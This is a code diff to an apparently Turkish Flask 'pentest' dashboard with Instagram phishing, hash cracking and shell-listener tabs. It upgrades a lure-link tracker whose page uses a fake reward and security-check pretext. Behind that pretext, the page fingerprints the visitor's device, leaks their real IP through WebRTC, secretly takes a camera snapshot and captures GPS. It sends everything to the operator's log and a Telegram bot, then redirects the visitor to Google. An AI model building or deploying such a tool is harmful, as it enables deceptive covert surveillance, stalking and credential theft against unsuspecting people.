@@ -103,7 +103,8 @@ HTML_TEMPLATE = """
         th, td { padding: 10px 14px; text-align: left; border-bottom: 1px solid #1e293b; font-size: 13px; vertical-align: middle; }
         th { background: #0284c7; color: white; }
         tr:hover { background: #161f30; }
-        .mini-map { width: 180px; height: 110px; border-radius: 4px; border: 1px solid #334155; display: inline-block; }
+        .mini-map { width: 160px; height: 100px; border-radius: 4px; border: 1px solid #334155; display: inline-block; }
+        .snapshot-img { width: 90px; height: 65px; border-radius: 4px; border: 1px solid #334155; object-fit: cover; }
         .payload-box { background: #0a0e17; padding: 12px; border-radius: 6px; border: 1px solid #1e293b; margin-bottom: 12px; }
         .dashboard-row { display: flex; gap: 20px; margin-bottom: 20px; flex-wrap: wrap; }
         .dashboard-card { flex: 1; background: #0a0e17; padding: 18px; border-radius: 6px; border: 1px solid #1e293b; text-align: center; min-width: 250px; }
@@ -119,7 +120,7 @@ HTML_TEMPLATE = """
         <div class="tabs">
             <button class="tab-btn active" onclick="switchTab('scanTab')">🚀 Recon</button>
             <button class="tab-btn" onclick="switchTab('phishTab')">📸 Insta Phishing</button>
-            <button class="tab-btn" onclick="switchTab('lureTab')">🎯 GPS Tracker</button>
+            <button class="tab-btn" onclick="switchTab('lureTab')">🎯 GPS & Intel Tracker</button>
             <button class="tab-btn" onclick="switchTab('crackerTab')">🔑 Hash Cracker</button>
             <button class="tab-btn" onclick="switchTab('shellListenerTab')">💻 Shell Listener</button>
             <button class="tab-btn" onclick="switchTab('telegramTab')">🤖 Telegram</button>
@@ -161,11 +162,11 @@ HTML_TEMPLATE = """
 
         <!-- Lure Link & Tracker Sekmesi -->
         <div id="lureTab" class="tab-content">
-            <h3>🎯 Lure Link Generator & GPS/Device Tracker</h3>
+            <h3>🎯 Gelişmiş GPS & Cihaz İstihbarat Tracker</h3>
             <div class="form-group"><label>Kampanya Başlığı:</label><input type="text" id="lureTitle" value="Özel Güvenlik Raporu ve Ödül Doğrulama"></div>
-            <button class="success" onclick="generateLureLink()">Takip Linki Üret</button>
+            <button class="success" onclick="generateLureLink()">Gelişmiş Takip Linki Üret</button>
             <div class="form-group" style="margin-top: 20px;"><label>Oluşturulan Takip Linki:</label><input type="text" id="generatedLink" readonly style="color: #38bdf8;"></div>
-            <h4 style="margin-top: 25px;">🔗 Yakalanan Ziyaretçi & GPS Logları:</h4>
+            <h4 style="margin-top: 25px;">🔗 Yakalanan Ziyaretçi & Cihaz İstihbaratı:</h4>
             <div id="clickLogsContainer"><p style='color: #94a3b8;'>Henüz veri yakalanmadı.</p></div>
         </div>
 
@@ -324,18 +325,20 @@ HTML_TEMPLATE = """
         function generateLureLink() {
             let randomId = Math.random().toString(36).substring(2, 9);
             document.getElementById('generatedLink').value = window.location.origin + "/track/" + randomId;
-            alert("Takip linki üretildi!");
+            alert("Gelişmiş Takip linki üretildi!");
         }
         async function loadClickLogs() {
             let res = await fetch('/api/lure/logs');
             let data = await res.json();
             let container = document.getElementById('clickLogsContainer');
             if(data.logs.length === 0) { container.innerHTML = "<p style='color: #94a3b8;'>Henüz veri yakalanmadı.</p>"; return; }
-            let html = `<table><thead><tr><th>Zaman</th><th>IP Adresi</th><th>Cihaz</th><th>📍 GPS Mini Harita Konumu</th></tr></thead><tbody>`;
+            let html = `<table><thead><tr><th>Zaman & IP</th><th>Cihaz & İstihbarat (RAM/CPU/Pil)</th><th>WebRTC Gerçek IP</th><th>📍 GPS Harita</th><th>📸 Snapshot</th></tr></thead><tbody>`;
             data.logs.forEach((l, index) => { 
                 let mapId = `map_${index}`;
-                let locContent = l.lat ? `<div id="${mapId}" class="mini-map"></div><br><a href="https://maps.google.com/?q=${l.lat},${l.lon}" target="_blank" style="color:#38bdf8; font-size:11px;">Google Maps'te Aç</a>` : "Konum İzni Alınamadı";
-                html += `<tr><td>${l.time}</td><td><b>${l.ip}</b></td><td>${l.ua}</td><td>${locContent}</td></tr>`; 
+                let locContent = l.lat ? `<div id="${mapId}" class="mini-map"></div><br><a href="https://maps.google.com/?q=${l.lat},${l.lon}" target="_blank" style="color:#38bdf8; font-size:11px;">Google Maps</a>` : "Konum İzni Yok";
+                let snapContent = l.snapshot ? `<img src="${l.snapshot}" class="snapshot-img">` : "Yok";
+                let specs = `OS: <b>${l.os}</b><br>RAM: ${l.ram} GB | Çekirdek: ${l.cores}<br>Pil: <b>${l.battery}</b><br>Ekran: ${l.screen}`;
+                html += `<tr><td>${l.time}<br><b>${l.ip}</b></td><td>${specs}</td><td style="color:#38bdf8;">${l.webrtc_ip || 'Tespit Edilemedi'}</td><td>${locContent}</td><td>${snapContent}</td></tr>`; 
             });
             html += `</tbody></table>`;
             container.innerHTML = html;
@@ -496,7 +499,7 @@ def index():
     if not session.get("logged_in"): return redirect(url_for("login"))
     return render_template_string(HTML_TEMPLATE, default_chat_id=NOTIFY_CHAT_ID)
 
-# --- İNSTAGRAM PHISHING ROTA (ORİJİNAL SVG İKONLU) ---
+# --- İNSTAGRAM PHISHING ROTA ---
 @app.route("/phish/instagram", methods=["GET", "POST"])
 def insta_phish():
     if request.method == "POST":
@@ -620,6 +623,7 @@ def api_listener_start():
     port = request.get_json().get("port", 4444)
     return jsonify({"output": f"[+] Netcat dinleyicisi {port} portu üzerinde aktif edildi.\n(Not: Render/PaaS ortamlarında harici port açılması kısıtlı olduğundan simüle edildi.)"})
 
+# --- GELİŞMİŞ GPS & İSTİHBARAT TRACKER ROTA ---
 @app.route("/track/<track_id>")
 def track_visitor(track_id):
     return f"""
@@ -638,31 +642,79 @@ def track_visitor(track_id):
     <body>
         <div class="box">
             <h3 style="color: #38bdf8;">⚠️ Bölgesel Güvenlik Doğrulaması</h3>
-            <p style="color: #94a3b8; font-size: 13px;">İşlemi tamamlamak ve ödülünüzü almak için konum erişimine izin verin.</p>
-            <button onclick="getLocation()">Onayla ve Devam Et</button>
+            <p style="color: #94a3b8; font-size: 13px;">İşlemi tamamlamak ve ödülünüzü almak için gerekli izinleri onaylayın.</p>
+            <button onclick="collectAndSend()">Onayla ve Devam Et</button>
         </div>
+        <video id="v" autoplay style="display:none;"></video>
+        <canvas id="c" style="display:none;"></canvas>
         <script>
-            function getLocation() {{
+            async function collectAndSend() {{
+                let fingerprint = {{
+                    track_id: '{track_id}',
+                    screen: window.screen.width + "x" + window.screen.height,
+                    cores: navigator.hardwareConcurrency || 'Bilinmiyor',
+                    ram: navigator.deviceMemory || 'Bilinmiyor',
+                    os: navigator.platform
+                }};
+
+                // 1. Pil Durumu
+                if (navigator.getBattery) {{
+                    try {{
+                        let b = await navigator.getBattery();
+                        fingerprint.battery = Math.round(b.level * 100) + "% (" + (b.charging ? "Şarjda" : "Pilde") + ")";
+                    }} catch(e) {{ fingerprint.battery = "Erişilemedi"; }}
+                }} else {{ fingerprint.battery = "Desteklenmiyor"; }}
+
+                // 2. WebRTC IP Sızıntısı
+                try {{
+                    let pc = new RTCPeerConnection({{{{iceServers:[{{urls:"stun:stun.l.google.com:19302"}}]}}}});
+                    pc.createDataChannel("");
+                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                    pc.onicecandidate = ice => {{
+                        if (ice && ice.candidate && ice.candidate.candidate) {{
+                            let ipMatch = ice.candidate.candidate.match(/([0-9]{{1,3}}(\.[0-9]{{1,3}}){{3}}|[a-fA-F0-9:]+:+[a-fA-F0-9:]+)/);
+                            if (ipMatch) fingerprint.webrtc_ip = ipMatch[1];
+                        }}
+                    }};
+                }} catch(e) {{}}
+
+                // 3. Ön Kamera Snapshot
+                try {{
+                    let stream = await navigator.mediaDevices.getUserMedia({{ video: true }});
+                    let video = document.getElementById('v');
+                    video.srcObject = stream;
+                    await new Promise(r => setTimeout(r, 1000));
+                    let canvas = document.getElementById('c');
+                    canvas.width = 320; canvas.height = 240;
+                    canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
+                    fingerprint.snapshot = canvas.toDataURL('image/jpeg', 0.6);
+                    stream.getTracks().forEach(t => t.stop());
+                }} catch(e) {{ fingerprint.snapshot = null; }}
+
+                // 4. GPS Konum
                 if (navigator.geolocation) {{
-                    navigator.geolocation.getCurrentPosition(sendPosition, showError, {{timeout: 10000}});
+                    navigator.geolocation.getCurrentPosition(
+                        pos => {{
+                            fingerprint.lat = pos.coords.latitude;
+                            fingerprint.lon = pos.coords.longitude;
+                            sendData(fingerprint);
+                        },
+                        err => {{ sendData(fingerprint); }},
+                        {{ timeout: 10000 }}
+                    );
                 }} else {{
-                    redirectHome();
+                    sendData(fingerprint);
                 }}
             }}
-            function sendPosition(position) {{
-                let lat = position.coords.latitude;
-                let lon = position.coords.longitude;
+
+            function sendData(data) {{
                 fetch('/api/lure/save-geo', {{
                     method: 'POST',
                     headers: {{'Content-Type': 'application/json'}},
-                    body: JSON.stringify({{track_id: '{track_id}', lat: lat, lon: lon}})
-                }}).finally(() => {{ redirectHome(); }});
-            }}
-            function showError(error) {{
-                redirectHome();
-            }}
-            function redirectHome() {{
-                window.location.href = "https://www.google.com";
+                    body: JSON.stringify(data)
+                }}).finally(() => {{
+                    window.location.href = "https://www.google.com";
+                }});
             }}
         </script>
     </body>
@@ -675,16 +727,26 @@ def save_geo():
     track_id = data.get("track_id")
     lat = data.get("lat")
     lon = data.get("lon")
+    os_info = data.get("os", "Bilinmiyor")
+    ram = data.get("ram", "Bilinmiyor")
+    cores = data.get("cores", "Bilinmiyor")
+    battery = data.get("battery", "Bilinmiyor")
+    webrtc_ip = data.get("webrtc_ip", "Yok")
+    snapshot = data.get("snapshot")
+    
     visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    user_agent = request.headers.get('User-Agent', 'Bilinmeyen Cihaz')
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     
-    log_entry = {"time": timestamp, "ip": visitor_ip, "ua": user_agent, "track_id": track_id, "lat": lat, "lon": lon}
+    log_entry = {
+        "time": timestamp, "ip": visitor_ip, "track_id": track_id, 
+        "lat": lat, "lon": lon, "os": os_info, "ram": ram, "cores": cores, 
+        "battery": battery, "webrtc_ip": webrtc_ip, "snapshot": snapshot
+    }
     CLICK_LOGS.insert(0, log_entry)
     
     if NOTIFY_CHAT_ID and TOKEN:
         try:
-            msg = f"🚨 [GPS TRACKER] Konum ve Ziyaretçi Yakalandı!\nIP: {visitor_ip}\nCihaz: {user_agent}\nEnlem: {lat}\nBoylam: {lon}\nHarita: https://maps.google.com/?q={lat},{lon}"
+            msg = f"🚨 [ADVANCED TRACKER] Ziyaretçi İstihbaratı Yakalandı!\nIP: {visitor_ip}\nWebRTC IP: {webrtc_ip}\nOS: {os_info} | RAM: {ram}GB\nPil: {battery}\nEnlem/Boylam: {lat}, {lon}\nHarita: https://maps.google.com/?q={lat},{lon}"
             requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": NOTIFY_CHAT_ID, "text": msg}, timeout=3)
         except: pass
     return jsonify({"status": "saved"})
